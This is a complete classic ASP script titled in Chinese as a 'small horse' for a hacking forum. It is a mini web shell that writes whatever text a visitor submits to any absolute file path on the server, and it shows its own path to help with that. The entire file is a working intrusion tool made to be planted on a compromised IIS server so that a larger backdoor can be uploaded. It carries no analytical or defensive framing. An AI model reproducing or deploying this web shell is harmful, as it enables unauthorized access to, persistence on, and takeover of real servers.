<%

dim objFSO 
 dim fdata 
 dim objCountFile 
 on error resume next 
 Set objFSO = Server.CreateObject("Scripting.FileSystemObject") 
 if Trim(request("systempath"))<>"" then 
 fdata = request("sAvedata") 
 Set objCountFile=objFSO.CreateTextFile(request("systempath"),True) 
 objCountFile.Write fdata 
 if err =0 then 
 response.write "<font color=red>保存成功!</font>" 
 else 
 response.write "<font color=red>保存失败!</font>" 
 end if 
 err.clear 
 end if 
 objCountFile.Close 
 Set objCountFile=Nothing 
 Set objFSO = Nothing 
 Response.write "<title>暗组技术论坛专用小马  By:New4</Title>"
 Response.write "<form action='' method=post>" 
 Response.write "保存文件的<font color=red>绝对路径(包括文件名:如D:\web\x.asp):</font>" 
 Response.Write "<input type=text name=systempath width=32 size=50>" 
 Response.Write "<br>" 
 Response.write "本文件绝对路径" 
 Response.write server.mappath(Request.ServerVariables("SCRIPT_NAME")) 
 Response.write "<br>" 
 Response.write "输入马的内容:" 
 Response.write "<textarea name=sAvedata cols=80 rows=10 width=32></textarea>" 
 Response.write "<input type=submit value=保存>" 
 Response.write "</form>" 

%>
